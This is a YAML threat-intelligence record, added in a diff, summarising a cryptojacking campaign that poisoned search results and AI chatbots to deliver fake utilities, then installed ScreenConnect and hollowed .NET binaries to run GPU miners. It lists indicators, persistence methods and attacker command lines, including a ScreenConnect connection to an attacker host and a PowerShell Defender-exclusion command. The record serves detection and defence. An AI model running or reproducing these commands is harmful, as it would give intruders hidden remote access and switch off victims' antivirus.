@@ -1,0 +1,125 @@
+title: Cryptojacking Campaign Using AI Chatbot Poisoning, DLL Sideloading, and ScreenConnect
+  Abuse
+description: A cryptojacking campaign uses SEO and AI chatbot poisoning to deliver
+  malicious software impersonating trusted utilities, employing DLL sideloading to
+  install ScreenConnect for persistent remote access, followed by process hollowing
+  into Microsoft-signed .NET binaries to run GPU miners while evading detection.
+attribution: ''
+malware_families:
+- SimpleRunPE
+- lolMiner
+- SRBMiner-MULTI
+- gminer
+- CoinMiner
+cves: []
+ttps:
+  processes:
+  - msiexec.exe
+  - ScreenConnect.ClientService.exe
+  - SimpleRunPE.exe
+  - RuntimeHost.exe
+  - InstallUtil.exe
+  - RegAsm.exe
+  - RegSvcs.exe
+  - MSBuild.exe
+  - AppLaunch.exe
+  - AddInProcess.exe
+  - aspnet_compiler.exe
+  - powershell.exe
+  - schtasks.exe
+  - SecurityHealthHost.exe
+  - lolMiner.exe
+  - SRBMiner-MULTI.exe
+  - miner.exe
+  - gminer.exe
+  command_lines:
+  - ScreenConnect.ClientService.exe "?e=Access&y=Guest&h=directdownload.icu&p=8041&s=b31c5795-9b66-4d20-ac8d-aad60d05852a&k=...&c=Crystaldeskinfo%20New%20New%20New&c=&c=&c=&c=&c=&c=&c="
+  - powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Add-MpPreference
+    -ExclusionPath @(...) -ErrorAction SilentlyContinue"
+  - schtasks.exe /query /tn <task name>
+  powershell:
+  - Add-MpPreference -ExclusionPath @(...) -ErrorAction SilentlyContinue
+  scripts: []
+  registry_keys:
+  - HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WinSysCache
+  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinSysCache
+  image_loads:
+  - autorun.dll
+  - vcredist_x64.dll
+  network_connections:
+  - ScreenConnect.ClientService.exe -> 193.42.11[.]108
+  - ScreenConnect.ClientService.exe -> directdownload[.]icu:8041
+  - RuntimeHost.exe -> minemine.gleeze[.]com:8443
+  - ScreenConnect client -> directdownload[.]icu
+  - hollowed binary -> wss[:]//minemine.gleeze[.]com:8443/ws
+  - ScreenConnect client -> 193.42.11[.]108
+  file_activity:
+  - autorun.dll
+  - vcredist_x64.dll
+  - SimpleRunPE.exe
+  - RuntimeHost.exe
+  - '%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeHost.lnk'
+  - vlc.exe
+  persistence:
+  - Scheduled task on user logon (highest privileges) named "Windows System Health"
+  - Scheduled task on system boot with 1-hour delay (highest privileges) named "Windows
+    System Health Monitor"
+  - Scheduled task every 5 minutes (highest privileges) named "Windows System Health
+    Check"
+  - Registry Run key (machine) HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WinSysCache
+  - Registry Run key (user) HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinSysCache
+  - Startup folder shortcut %AppData%\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeHost.lnk
+  - ScreenConnect remote management tool installed silently via msiexec.exe using
+    vcredist_x64.dll
+  - Scheduled task creation with names "Windows System Health Monitor" or "Windows
+    System Health"
+  - Malicious ASEP registry modification linked to malicious binary execution
+  - Suspicious .LNK file placed in startup folder
+  process_relations:
+  - autorun.dll -> msiexec.exe
+  - SimpleRunPE.exe -> InstallUtil.exe
+  - SimpleRunPE.exe -> RegAsm.exe
+  - SimpleRunPE.exe -> RegSvcs.exe
+  - SimpleRunPE.exe -> MSBuild.exe
+  - SimpleRunPE.exe -> AppLaunch.exe
+  - SimpleRunPE.exe -> AddInProcess.exe
+  - SimpleRunPE.exe -> aspnet_compiler.exe
+  - RuntimeHost.exe -> msiexec.exe /i /quiet
+iocs:
+  hashes:
+  - 16562974deec80e41ef57a71a6de8c03ceb393005fb1432f8d9d82c61294ef8c
+  - 1b2555b09ac62164638f47c8272beb6b0f97186e37d3a54cb84c723ff7a2eee5
+  - 062bb28765fbaa11f8cc341fa16e2c7f942a122d929cb41f4a0f755b4429f246
+  - c7425fbe6c3a4937934215c54027d4b67202d12ab490682fae03498870d66d06
+  - a460d00ef93c8ce70d32e48e55781af66a53328fc2dde45519be196c265de074
+  - db2d33c4e6e4a5c2263b56e8303c343305a94dde1fc2968304ba260acbbd9f9f
+  - cf3f8160eb5a5580e0c35054847e3ac4d01e9fe74fab8bc12bf6e8a40bf696b2
+  - 69077fcf940fc5852fb32beed15636756ebc04ac971b7ed71d36251e7ea70a20
+  - 2ee93ccbcd49ed94c65dcf52e7dcb8f0fa0a443ca24c0e0c7f79152efba657b7
+  - 9ff07c9fafa9c03fdf69e4abf6806aa7c938b5480e7e258f227db0719ecd6386
+  - 7035c2abeb617e828dfda1b119b8544fa9ae15a1d263d18bc5506acaf381f496
+  - e021662a652ba95c8778b991056696ab3c9b0f60d5e23b1e6cf73c3847db6610
+  ip_addresses:
+  - 193.42.11[.]108
+  - 93.115[.]10.35
+  - 198.23[.]185.238
+  - 2.59.132[.]106
+  domains:
+  - gleeze[.]com
+  - directdownload[.]icu
+  - minemine.gleeze[.]com
+  - direct-download[.]giize[.]com
+  - free-download[.]giize[.]com
+  - giize[.]com
+  - dynu[.]com
+  - direct-download[.]gleeze[.]com
+  - start-download[.]gleeze[.]com
+  - direct-downloads[.]giize.com
+  - free-download[.]giize.com
+  urls:
+  - wss[:]//minemine.gleeze[.]com:8443/ws
+authors:
+- Parasharan Raghavan
+reference: https://www.microsoft.com/en-us/security/blog/2026/05/26/poisoned-search-results-gpu-mining-cryptojacking-campaign-abusing-screenconnect-microsoft-net-utilities/
+date_of_publication: May 26, 2026
+file_creation_date: June 01, 2026
